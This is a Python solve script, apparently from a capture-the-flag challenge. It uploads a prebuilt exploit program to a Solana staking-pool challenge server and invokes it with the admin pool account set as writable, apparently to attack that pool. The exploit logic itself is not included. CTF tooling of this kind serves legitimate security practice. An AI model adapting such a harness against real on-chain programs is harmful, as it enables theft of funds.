#!/usr/bin/env python3

import socket
import sys
import os
import re

def send_exploit(host, port):
    exploit_path = "solve/target/deploy/staking_pool_solve.so"
    
    if not os.path.exists(exploit_path):
        print(f"Error: {exploit_path} not found!")
        print("Build first: cd solve && cargo build-sbf")
        return
    
    with open(exploit_path, "rb") as f:
        exploit_data = f.read()
    
    print(f"[*] Loaded exploit: {len(exploit_data)} bytes")
    print(f"[*] Connecting to {host}:{port}...")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    # Receive banner and credentials
    response = b""
    while b"program pubkey:" not in response:
        chunk = sock.recv(4096)
        if not chunk:
            print("[!] Server disconnected")
            return
        response += chunk
    
    banner_text = response.decode('utf-8', errors='ignore')
    print(banner_text)
    
    # Extract important addresses from the banner
    user_match = re.search(r'Address:\s+(\w+)', banner_text)
    program_match = re.search(r'Program ID:\s+(\w+)', banner_text)
    admin_pool_match = re.search(r'Admin Pool:\s+(\w+)', banner_text)
    
    if not (user_match and program_match and admin_pool_match):
        print("[!] Failed to extract addresses from banner")
        return
    
    user_pubkey = user_match.group(1)
    program_pubkey = program_match.group(1)
    admin_pool_pubkey = admin_pool_match.group(1)
    
    print(f"\n[*] Extracted addresses:")
    print(f"  User: {user_pubkey}")
    print(f"  Program: {program_pubkey}")
    print(f"  Admin Pool: {admin_pool_pubkey}\n")
    
    # Generate a unique pubkey for the solve program
    import hashlib
    import base58
    solve_program_seed = hashlib.sha256(exploit_data).digest()
    solve_program_pubkey = base58.b58encode(solve_program_seed).decode('ascii')
    sock.sendall(f"{solve_program_pubkey}\n".encode())
    
    # Send program length
    sock.sendall(f"{len(exploit_data)}\n".encode())
    
    # Send program binary
    sock.sendall(exploit_data)
    
    print("[+] Exploit program sent")
    print("[*] Waiting for instruction prompt...\n")
    
    # Wait for "num accounts:" prompt
    response = b""
    while b"num accounts:" not in response:
        chunk = sock.recv(4096)
        if not chunk:
            print("[!] Server disconnected")
            return
        response += chunk
        print(chunk.decode('utf-8', errors='ignore'), end='')
    
    # Send instruction with accounts
    # Accounts needed by solve program:
    # 0: User (writable, signer)
    # 1: Staking program (readonly)
    # 2: Admin pool PDA (writable)
    # 3: System program (readonly)
    
    print("\n[*] Sending instruction accounts...")
    sock.sendall(b"4\n")  # num accounts
    sock.sendall(f"ws {user_pubkey}\n".encode())  # user (writable, signer)
    sock.sendall(f"x {program_pubkey}\n".encode())  # staking program (readonly)
    sock.sendall(f"w {admin_pool_pubkey}\n".encode())  # admin pool (writable)
    sock.sendall(b"x 11111111111111111111111111111111\n")  # system program (readonly)
    sock.sendall(b"0\n")  # ix data length (no data needed)
    
    print("[+] Instruction sent")
    print("[*] Waiting for results...\n")
    
    # Receive results
    while True:
        data = sock.recv(4096)
        if not data:
            break
        print(data.decode('utf-8', errors='ignore'), end='')
    
    sock.close()
    print("\n\n[+] Done!")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 solve.py <host> <port>")
        print("Example: python3 solve.py localhost 5001")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    send_exploit(host, port)
